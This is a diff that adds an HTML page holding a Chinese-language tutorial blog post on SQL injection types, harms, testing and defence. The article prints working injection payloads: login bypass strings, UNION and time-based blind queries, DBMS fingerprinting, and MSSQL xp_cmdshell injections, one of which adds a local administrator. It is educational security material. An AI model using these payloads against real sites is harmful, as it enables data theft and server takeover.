@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="content-language" content="zh-CN"/>
+    <meta name="author" content="WeiyiGeek" />
+    <meta name="msvalidate.01" content="5C552FB1D885E0E11D2957EC958C8018" />
+    <meta name="shenma-site-verification" content="4c655e91c76be0a93c1b6954c666c9d6_1649049085"/>
+    <meta name="bytedance-verification-code" content="lKs4FqwCHSJ3A/c5tT7X" />
+    <meta name="sogou_site_verification" content="OC65iET6Bk" />
+    
+    <title>🌐 SQL注入类型危害及防御|WeiyiGeek Blog|唯一极客Geek-IT网络安全运维开发技术知识分享-博客站点</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+    <meta name="keywords" content="SQL注入">
+    <meta name="Description" content="WeiyiGeek-唯一极客博客站点,关注于网络安全运维,Web安全开发,IOT物联网安全开发,应用开发,分享技术学习知识与入坑解决,提升网络安全技术与自身技术能力,立志维护大众网络安全为己任,做一个对国家有用的人,为实现中华民族伟大复兴的中国梦不懈奋斗">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="/css/jquery/3.5.2-jquery.fancybox.min.css?v=1.6.6" />
+    <link rel="stylesheet" href="/css/style.css?v=1.6.6">
+    <!--  -->
+     <script type="text/javascript" src="/js/custom/articlecost.js?v=1.6.6"></script> 
+    <link rel="stylesheet" href="/css/third-party/gitalk.css?v=1.6.6"> 
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}')
+        };
+    </script>
+    <script type="text/javascript">window.lazyScripts=[];</script>
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="WeiyiGeek Blog" type="application/atom+xml">
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg" alt="WeiyiGeek-backgroud">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg" alt="WeiyiGeek-头像">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">WeiyiGeek</h5>
+          <a href="mailto:master@weiyigeek.top" title="master@weiyigeek.top" class="mail">
+            <span>m</span><span>a</span><span>s</span><span>t</span><span>e</span><span>r</span><span>@</span><span>w</span><span>e</span><span>i</span><span>y</span><span>i</span><span>g</span><span>e</span><span>e</span><span>k</span><span>.</span><span>t</span><span>o</span><span>p</span>
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://weiyigeek.top/img/wechat-search.png" target="_blank">
+                  <i class="icon icon-lg icon-wechat"></i>
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/weiyigeek" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://t.me/WeiyiGeek" target="_blank">
+                  <i class="icon icon-lg icon-telegram"></i>
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://twitter.com/WeiyiGeek" target="_blank">
+                  <i class="icon icon-lg icon-twitter"></i>
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://weibo.com/615643678" target="_blank">
+                  <i class="icon icon-lg icon-weibo"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                首页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                文章分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                文章标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                文章归档
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/books"  >
+                <i class="icon icon-lg icon-book"></i>
+                学习书籍
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于作者
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-link"></i>
+                站点导航
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://weiyigeek.top/img/wechat-search.png" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                公众账号
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://space.bilibili.com/385802642" target="_blank" >
+                <i class="icon icon-lg icon-youtube-play"></i>
+                哔哩哔哩
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://github.com/weiyigeek" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://twitter.com/WeiyiGeek" target="_blank" >
+                <i class="icon icon-lg icon-twitter"></i>
+                Twitter
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://weibo.com/615643678" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>SQL注入类型危害及防御</span>
+            
+        </div>
+
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+
+        
+            <a href="/atom.xml" class="header-icon pull-right waves-effect waves-circle waves-light">
+                <i class="icon icon-lg icon-rss"></i>
+            </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg" alt="文章头部背景">
+    <div class="container fade-scale">
+        <h1 class="title">SQL注入类型危害及防御</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-03-28T09:34:30.000Z" itemprop="datePublished" class="page-time">
+  2019-03-28
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E9%BB%91%E9%98%B2/">黑防</a><ul class="article-category-list-child"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E9%BB%91%E9%98%B2/%E7%BD%91%E7%AB%99%E7%AE%A1%E7%90%86/">网站管理</a></li></ul></li></ul>
+
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-网安大类/OWASPTOP/SQLInject/SQL注入类型危害及防御"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">SQL注入类型危害及防御</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-03-28 17:34:30" datetime="2019-03-28T09:34:30.000Z"  itemprop="datePublished">2019-03-28</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E9%BB%91%E9%98%B2/">黑防</a><ul class="article-category-list-child"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E9%BB%91%E9%98%B2/%E7%BD%91%E7%AB%99%E7%AE%A1%E7%90%86/">网站管理</a></li></ul></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <p><b style="color:red">注意：本文分享给安全从业人员,网站开发人员和运维人员在日常工作中使用和防范恶意攻击, 请勿恶意使用下面描述技术进行非法操作。</b></p>
+<p>[TOC]</p>
+<a id="more"></a>
+<h4 id="0x00-前言简述"><a href="#0x00-前言简述" class="headerlink" title="0x00 前言简述"></a>0x00 前言简述</h4><p>本文主要以浅谈SQL注入漏洞进行学习总结，帮助新入门安全学习的小白快速入门SQL注入基础；<br>在安全圈里总所周知，注入攻击是一个非常传统的攻击方式, 且SQL注入方式与手段变化多端；在日常漏洞中SQL注入占比约10%在OWASP Top榜单曾一度位居第一,虽不算高占比但其危害极大,业内企业因此蒙受损失的新闻层出不穷。</p>
+<p><em>Q: SQL注入的定义?</em></p>
+<blockquote>
+<p>答: SQL Injection 是这样的一种漏洞应用程序向后台数据库传递<code>SQL(Structured Query Language-结构化的查询语言)</code>时候，如果攻击者提供了影响该查询的能力便会引发SQL注入安全问题;<br>简单的说就是攻击者通过影响传递给数据库的内容来修改SQL自身的语法和功能，并且会影响SQL所支持的数据库和操作系统的功能和灵活性;</p>
+</blockquote>
+<p><br></p>
+<p><em>SQL注入漏洞原理:</em><br>描述:脚本攻击主要是针对动态网站进行的攻击,其原因是在建立动态网页的过程中没有对用户的输入输出进行有效的合法性验证,使应用程序存在安全隐患。用户可以提交一段数据库查询代码, 根据程序返回的结果,获得某些他想得知的数据或进行数据库操作；</p>
+<h4 id="0x00-的危害与防御"><a href="#0x00-的危害与防御" class="headerlink" title="0x00 的危害与防御"></a>0x00 的危害与防御</h4><p><strong>SQL注入漏洞危害：</strong><br>例如数据库被拖库,管理员和重要人员信息泄露,甚至还能通过SQL注入漏洞直接获取webshell或者执行命令导致服务器系统权限被获取等等。<br><figure class="image-box">
+                <a rel=SQL注入类型危害及防御 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190328170830.png" target="_blank" title="WeiyiGeek.SQL注入漏洞危害" data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190328170830.png" alt="WeiyiGeek.SQL注入漏洞危害" title="" class=""></a>
+                <p>WeiyiGeek.SQL注入漏洞危害</p>
+            </figure></p>
+<h4 id="0x01-SQL注入漏洞的分类"><a href="#0x01-SQL注入漏洞的分类" class="headerlink" title="0x01 SQL注入漏洞的分类"></a>0x01 SQL注入漏洞的分类</h4><h5 id="1-按照SQL注入利用方式分类"><a href="#1-按照SQL注入利用方式分类" class="headerlink" title="(1) 按照SQL注入利用方式分类"></a>(1) 按照SQL注入利用方式分类</h5><ul>
+<li>盲注 </li>
+<li>Error 报错注入</li>
+<li>Time 时间盲住</li>
+<li>Union 注入</li>
+<li>内联查询注入</li>
+<li>拼接（堆）查询注入</li>
+</ul>
+<p><em>Q：目前所掌握的注入漏洞种类,出现频率较高有哪些？</em><br>比如：盲注,time 时间盲注,报错注入,union注入（在不影响正常服务的情况下,拼接查询算最高危害的,接下来就是union）；</p>
+<p><em>Q：比较易被检测出来的有哪些？</em><br>     比如：盲注,time 时间盲注,报错注入等；</p>
+<p><em>Q：关于注入的位置常常有那些？</em><br>常发生于用户和服务交互处（增删改查操作）,AJAX,API接口等等,用这个检测报错注入,比较方便。</p>
+<h5 id="2-按照攻击入口分类"><a href="#2-按照攻击入口分类" class="headerlink" title="(2) 按照攻击入口分类"></a>(2) 按照攻击入口分类</h5><ul>
+<li>GET型的SQL注入</li>
+<li>POST型SQL注入</li>
+<li>Cookie型SQL注入（Cookies中转注入）</li>
+<li>Header型SQL注入</li>
+</ul>
+<h5 id="3-按照注入点类型分类"><a href="#3-按照注入点类型分类" class="headerlink" title="(3) 按照注入点类型分类"></a>(3) 按照注入点类型分类</h5><ol>
+<li><p>整型注入<br>测试方法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://host/test.php?id=100 and 1=1  返回成功</span><br><span class="line">http://host/test.php?id=100 and 1=2  返回失败</span><br><span class="line">产生原因：sqlstr = "<span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">"+request. getParameter("</span><span class="keyword">id</span><span class="string">")</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>字符型注入<br>测试方法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://host/test.php?name=rainman' and '1'='1 返回成功</span><br><span class="line">http://host/test.php?name=rainman' and '1'='2 返回失败</span><br><span class="line">产生原因：sqlstr = "<span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'"+ request.getParameter("name") + "'</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>搜索型注入<br>测试方法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://host/test.php?keyword=test%' and '%'=' 返回test查询相同结果</span><br><span class="line">http://host/test.php?id=test%' and '%'=' 返回少于test 查询结果的内容</span><br><span class="line">​</span><br><span class="line">产生原因：</span><br><span class="line">sqlstr = "<span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> keywordlike <span class="string">'%" + request. getParameter("keyword")+ "%'</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>盲注型注入</p>
+</li>
+</ol>
+<h5 id="4-注入方式"><a href="#4-注入方式" class="headerlink" title="(4) 注入方式"></a>(4) 注入方式</h5><ol>
+<li><p>内联式SQL注入<br>内联注入是指查询注入SQL代码后,原来的查询仍然全部执行；</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sqlstr = "<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username =<span class="string">'"+username+"'</span> <span class="keyword">and</span> <span class="keyword">password</span> = <span class="string">'"+password+"'</span><span class="string">"</span></span><br><span class="line"><span class="string">                                                 username = "</span><span class="string">' or '</span><span class="keyword">test</span><span class="string">'='</span><span class="string">"</span></span><br><span class="line"><span class="string">                                                 password = "</span><span class="string">' or '</span>pass<span class="string">'='</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>终止式SQL注入<br>终止式SQL语句注入是指攻击者在注入SQL代码时,通过注释剩下的查询来成功结束该语句,被注释的查询不会被执行;</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username = ‚' or ''='' <span class="comment">--‚</span></span><br><span class="line">password = ‚any string'</span><br><span class="line">​</span><br><span class="line">常见的终止方式</span><br><span class="line">• 终止字符串： <span class="comment">-- , #, %23, %00, /*</span></span><br><span class="line">• 终止方法： <span class="comment">-- , '-- , ')-- , ) -- , ')) --,))--</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol start="3">
+<li>union 注入<br>Union是数据库管理员经常使用且可以掌控的运算符之一,可以使用它连接两条或多条select语句的查询结果。<br>其基本语法如下：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> colum1,colum2,colum3,…,<span class="keyword">columN</span> <span class="keyword">from</span> table1 <span class="keyword">Union</span> <span class="keyword">Select</span> colum1,colum2,colum3,…,<span class="keyword">columN</span> <span class="keyword">from</span> table2</span><br><span class="line">​</span><br><span class="line">使用<span class="keyword">union</span>获取数据规则：</span><br><span class="line">- 两个查询返回的列数必须相同。</span><br><span class="line">- 两个<span class="keyword">SELECT</span>语句返回的数据库对应的列必须类型相同或兼容（字段类型一致）</span><br><span class="line">- 通常只有终止式注入时,可较快猜解并利用,否则要知道原始的<span class="keyword">SQL</span>语句才能比较方便的利用</span><br></pre></td></tr></table></figure>
+如果应用返回第一个（原始）查询得到的数据,那么通过在第一个查询后注入一个UNION运算符,并添加另一个任意查询,便可读取到数据库用户有权限访问的任何一张表 (主要需要进行测试占位符) 。</li>
+</ol>
+<p>Union语句的构建</p>
+<ul>
+<li>万能列类型：大部分数据库中NULL可兼容任何类型的数据,所有可使用NULL匹配数据表的列类型</li>
+<li>确定列数量：使用union select null,null,null,…,null from dual逐步增加null数量,直到匹配原语句的列数量,成功匹配后返回正常页面<br>  使用order by 确原语句列数量, 可使用折半查找法提高猜测效率</li>
+<li>确定列类型：Union select 1,’2’,null,…,null from dual,先猜测第一列为数字,如果不正确则判断为字符,如果还是不正确则保持null不变（可能为二进制类型）,依次完成部分或全部类型的判断；</li>
+<li>其他:Mysql数字/字符类型可直接转换,可直接使用select 1,2,3,…,n 方式构建union</li>
+</ul>
+<p><strong>Q：Union不适用的地方有那些？</strong><br>A：注入语句无法截断,且不清楚完整的SQL查询语句；Web页面中有两个SQL查询语句,查询语句的列数不同；</p>
+<ol start="4">
+<li>盲注<br>4.1) 基于时间的攻击（delay）<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> Mssql    <span class="comment">--#命令执行</span></span><br><span class="line">   http://host/products.asp?id=12;if+(system_user='sa')+exec master..xp_cmdshell'ping localhost'</span><br><span class="line"> Mysql    <span class="comment">--#执行sha1函数1000000次</span></span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">benchmark</span>(<span class="number">1000000</span>, <span class="keyword">sha1</span>(<span class="string">'test'</span>))  </span><br><span class="line"> <span class="keyword">Oracle</span>   <span class="comment">--#请求测试</span></span><br><span class="line">    <span class="keyword">select</span> utl_http.request(<span class="string">'http://10.0.0.1'</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>4.2) 基于boolen注入<br>MSSQL:如果用户属于sysadmin, id = 12/1 返回正常页面,否则返回错误页面 <a href="http://host/products.asp?id=12/is_srvrolemember(&#39;sysadmin&#39;)" target="_blank" rel="noopener">http://host/products.asp?id=12/is_srvrolemember(&#39;sysadmin&#39;)</a><br>• 返回正常页面,判断成立<br>• 返回错误页面,判断失败</p>
+<h5 id="5-按报错错误分类数据库注入"><a href="#5-按报错错误分类数据库注入" class="headerlink" title="(5) 按报错错误分类数据库注入"></a>(5) 按报错错误分类数据库注入</h5><p>要成功的发动SQL注入攻击,最重要的是知道应用正在使用的DBMS,没有这一信息就不可能向查询注入信息并提取自己所感兴趣的数据.<br>原因：不同数据库之间存在语法差异和特性;</p>
+<ol>
+<li>ACCESS Databases + ASP<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">注入点：http://xx.xxx.xx.xx/playnews.asp?id=772' and '1=1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Microsoft OLE DB Provider <span class="keyword">for</span> ODBC Drivers 错误 <span class="string">'80040e14'</span>  [Microsoft][ODBC Microsoft Access Driver] 字符串的语法错误 </span></span><br><span class="line"><span class="meta">#</span><span class="bash">查询表达式 <span class="string">'id = 772'</span><span class="string">' 中 /displaynews.asp,行31</span></span></span><br><span class="line"></span><br><span class="line">特有数据表进行判断:</span><br><span class="line">http://host/test.php?id=100 and (select count(*) from sysobjects)&gt;0 and 1=1</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol start="2">
+<li>MSSQL Databases + ASPX<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--#报错信息：[Microsoft][ODBC SQL ServerDriver][SQL Server] 字符串''之前有未闭合的引号</span></span><br><span class="line"></span><br><span class="line">特有数据表进行判断:</span><br><span class="line">http://host/test.php?id=100 and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> sysobjects)&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br><span class="line">注入点：<span class="keyword">http</span>://www.test.com/showdetail.asp?<span class="keyword">id</span>=<span class="number">49</span><span class="string">' And (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES);--  </span></span><br><span class="line"><span class="string">执行SQL语句：Select * from 表名 where 字段='</span><span class="number">49</span><span class="string">' And (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES);--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">字符连接方式判断：</span></span><br><span class="line"><span class="string">http://host/test.php?id=100 and '</span><span class="number">1</span><span class="string">'+'</span><span class="number">1</span><span class="string">'='</span><span class="number">11</span><span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">获取非字符类型错误</span></span><br><span class="line"><span class="string">http://host/products.asp?id=12 and (select top 1 char(94)+(id as varchar(256)) from admin) &gt;0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">基于时间盲注：</span></span><br><span class="line"><span class="string">http://host/products.asp?id=12;if+(system_user='</span>sa<span class="string">')+waitfor+delay+'</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">5</span><span class="string">'--</span></span><br><span class="line"><span class="string">http://host/products.asp?id=12;if+(system_user='</span>sa<span class="string">')+exec master..xp_cmdshell'</span>ping localhost<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">关键点：SQL Server内置的存储过程xp_cmdshell ：</span></span><br><span class="line"><span class="string">http://www.test.com/showdetail.asp?id=49'</span>;exec master..xp_cmdshell "net localgroup administrators name /add"<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol start="3">
+<li>Mysql + php<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--#报错：Mysql: ERROR 1064 (42000): You have anerror in your SQL syntax; check the manualthat corresponds to your MySQL serverversion for the right syntax to use near</span></span><br><span class="line"></span><br><span class="line">特有数据表进行判断:</span><br><span class="line">http://host/test.php?id=100 and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.TABLES)&gt;<span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> mysql&gt; <span class="number">5.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">字符连接方式判断：</span><br><span class="line"><span class="keyword">http</span>://host/test.php?<span class="keyword">id</span>=<span class="number">100</span> <span class="keyword">and</span> <span class="string">'1'</span>+<span class="string">'1'</span>=<span class="string">'11'</span></span><br><span class="line"><span class="keyword">http</span>://host/test.php?<span class="keyword">id</span>=<span class="number">100</span> <span class="keyword">and</span> <span class="keyword">CONCAT</span>(<span class="string">'1'</span>,<span class="string">'1'</span>)=<span class="string">'11'</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol start="4">
+<li>Oracle + jsp<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">报错：Oracle: ORA-01756: 括号内的字符串没有正确结束</span></span><br><span class="line">select utl_inaddr.get_host_name((select banner from v$version where rownum= 1)) from dual;</span><br><span class="line"></span><br><span class="line">特有数据表进行判断:</span><br><span class="line">http://host/test.php?id=100 and (select count(*) fromsys.user_tables)&gt;0 and 1=1</span><br><span class="line"></span><br><span class="line">字符连接方式判断：</span><br><span class="line">http://host/test.php?id=100 and '1' || '1'='11'</span><br><span class="line">http://host/test.php?id=100 and CONCAT('1','1')='11'</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="0x03-SQL白盒与黑盒测试方法"><a href="#0x03-SQL白盒与黑盒测试方法" class="headerlink" title="0x03 SQL白盒与黑盒测试方法"></a>0x03 SQL白盒与黑盒测试方法</h4><ol>
+<li>白盒的测试：<br>1) 快速方式是关键词匹配，找到SQL语句后，看看这些SQL语句在哪被调用，变量的值来自哪里被带入了，是否有安全校验，安全校验是否匹配当前SQL操作的具体场景（字符集编码等也要留意），沿着变量和函数的调用，一直回溯查到输入点就好。</li>
+</ol>
+<p>2) 了解代码使用的框架或者代码结构，看代码对请求进行路由和分发的方式，路由分发方式的设计和实现是否存在隐患，记录一下再看看是否有一些统一的安全filter，记录下他的特性（任何统一的安全filter都会因为不了解后端调用的场景而产生绕过），然后再看看是否有基础的DB库，这个库是否实现了安全的SQL操作。</p>
+<p>3) 了解业务实现的方式，设计的思路，这样黑盒看到同类网站，就可以知道怎么下手知识面越广也越容易发现更多的技巧，了解搭配的数据库版本(MYSQL，MSSQL，Sybase，Oracle，Access)</p>
+<p><br></p>
+<ol start="2">
+<li>黑盒的测试：<br>我觉得查询SELECT型的注入很容易被发现，其实可以多考虑考虑insert update里的注入点发现，关系型数据库里，结合这个接口的功能，提交的返回值对比，response code 5xx ，其实也容易黑盒发现注入点。<br>同时在用户输入处进行测试,表单提交,get/post/request,关注API接口等等请求SQL注入测试。</li>
+</ol>
+<h4 id="0x04-SQL监测和防御这类漏洞"><a href="#0x04-SQL监测和防御这类漏洞" class="headerlink" title="0x04 SQL监测和防御这类漏洞"></a>0x04 SQL监测和防御这类漏洞</h4><p>最好的防御,是内部先发现做策略,开发时过滤特殊字符： 单引号、双引号、斜杠、反斜杠、冒号、 空字符等的字符 ；<br>过滤的对象:   用户的输入 |  提交的URL请求中的参数部分   | 从cookie中得到的数据 ；<br>监测方面目前大多都是日志监控+WAF（统一的filter）,部署防SQL注入系统或脚本 ；<br>数据库日志容易解析,语法出错的、语法读Info表的建立黑白名单机制,都明确是黑客嘛；</p>
+
+        </div>
+        
+  <hr>
+  <p> 欢迎各位志同道合的朋友一起学习交流，如文章有误请在下方留下您宝贵的经验知识，个人邮箱地址<b style="color:#ff654e"><code>【master#weiyigeek.top】</code></b>或者个人公众号<b style="color:#ff654e"><code>【WeiyiGeek】</code></b>联系我。 </p>
+
+  <p> 更多文章来源于<b style="color:#03a9f4">【WeiyiGeek Blog - 为了能到远方，脚下的每一步都不能少】</b>, 个人首页地址( <a style="color: #03a9f4;" href="https://weiyigeek.top" target="_blank"> https://weiyigeek.top </a> )</p>
+
+  <p>专栏书写不易，如果您觉得这个专栏还不错的，请给这篇专栏 <b style="color: red;">【点个赞、投个币、收个藏、关个注，转个发】(人间五大情)</b>，这将对我的肯定，谢谢！。</p>
+
+  <div>
+    <img src="https://www.weiyigeek.top/img/weiyigeek.jpg" class="img-responsive" alt="WeiyiGeek-banner">
+  </div>
+
+  <ul style="font-weight: bolder;">
+    <li>
+      <p><span style="color: #03a9f4">echo&nbsp;&nbsp;"【点个赞】，动动你那粗壮的拇指或者芊芊玉手，亲！"</span></p>
+    </li>
+    <li>
+      <p><span style="color: #ff9201">printf("%s",&nbsp;"【投个币】，万水千山总是情，投个硬币行不行，亲！")</span></p>
+    </li>
+    <li>
+      <p><span style="color: #02a2ff">fmt.Printf("【收个藏】，阅后即焚不吃灰，亲！")&nbsp;&nbsp;</span></p>
+    </li>
+    <li>
+      <p><span style="color:red">console.info("【转个发】，让更多的志同道合的朋友一起学习交流，亲！")</span></p>
+    </li>
+    <li>
+      <p><span style="color: #ff654e">System.out.println("【关个注】，后续浏览查看不迷路哟，亲！")</span></p>
+    </li>
+  </ul>
+
+  <div>
+    <img src="https://www.weiyigeek.top/img/wechat-search.png" class="img-responsive" alt="扫描follow(关注)WeiyiGeek公众号"  width="328" height="149">
+  </div>
+
+  <hr>
+  
+
+
+  <blockquote class="post-copyright">
+    <div class="content">
+      
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2022-03-29T06:20:31.554Z" itemprop="dateUpdated">2022-03-29 14:20:31</time>
+</span><br>
+
+
